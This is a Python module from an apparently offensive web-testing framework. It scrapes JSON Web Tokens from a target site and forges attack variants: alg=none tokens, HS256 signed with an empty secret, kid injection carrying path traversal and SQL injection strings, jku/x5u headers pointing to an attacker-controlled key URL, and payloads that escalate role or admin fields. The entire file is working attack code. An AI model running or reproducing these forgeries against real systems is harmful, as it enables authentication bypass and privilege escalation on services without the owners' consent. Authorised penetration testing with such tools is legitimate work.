"""jwt_bypass — JWT attack suite: none, alg confusion, kid injection, jku/x5u"""
import base64, json, hmac, hashlib, re, os, time
from core.http import HttpClient

def b64e(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def b64d(s):
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)

class JwtBypass:
    def run(self, session, logger):
        http = HttpClient(session, logger)
        r = http.get(session.target)
        if not r: return {}
        JWT_RE = re.compile(r"eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*")

        tokens = JWT_RE.findall(r.text)[:3]
        for c in r.cookies:
            if JWT_RE.match(c.value): tokens.append(c.value)
        if not tokens:
            print("[jwt_bypass] no tokens"); return {}

        token = tokens[0]
        print(f"[jwt_bypass] token: {token[:60]}...")
        try:
            h, p, s = token.split(".")
            header = json.loads(b64d(h))
            payload = json.loads(b64d(p))
        except Exception as e:
            print(f"  decode error: {e}"); return {}

        attacks = {}

        # 1. alg=none variations
        for alg_val in ["none", "None", "NONE", "nOnE"]:
            forged = b64e(json.dumps({"alg":alg_val,"typ":"JWT"}).encode()) + "." + \
                     b64e(json.dumps(payload).encode()) + "."
            attacks[f"alg_{alg_val}"] = forged

        # 2. alg=HS256 with empty secret
        signing = f"{h}.{p}".encode()
        empty_sig = b64e(hmac.new(b"", signing, hashlib.sha256).digest())
        attacks["hs256_empty"] = f"{h}.{p}.{empty_sig}"

        # 3. kid injection (path traversal / SQLi)
        for kid_val in ["../../../../etc/passwd", "/dev/null", "' OR '1'='1", "key"]:
            new_h = dict(header); new_h["kid"] = kid_val
            forged = b64e(json.dumps(new_h).encode()) + "." + b64e(json.dumps(payload).encode()) + "."
            attacks[f"kid_{kid_val[:10]}"] = forged

        # 4. jku / x5u header injection
        for field in ["jku", "x5u"]:
            new_h = dict(header); new_h[field] = "https://attacker.example/jwks.json"
            forged = b64e(json.dumps(new_h).encode()) + "." + b64e(json.dumps(payload).encode()) + "."
            attacks[f"{field}_injection"] = forged

        # 5. privileged payload mutations
        for field in ["role","admin","isAdmin","is_admin","type","user_type"]:
            if field in payload:
                esc = dict(payload)
                if isinstance(payload[field], bool): esc[field] = True
                elif isinstance(payload[field], int): esc[field] = 9999
                else: esc[field] = "admin"
                forged = b64e(json.dumps({"alg":"none","typ":"JWT"}).encode()) + "." + \
                         b64e(json.dumps(esc).encode()) + "."
                attacks[f"esc_{field}"] = forged

        print(f"[jwt_bypass] generated {len(attacks)} attack variants")
        for name, t in attacks.items():
            print(f"  [{name}] {t[:70]}...")
            logger.finding("jwt_attack","info",f"{name}")

        return {"original": token, "attacks": attacks}
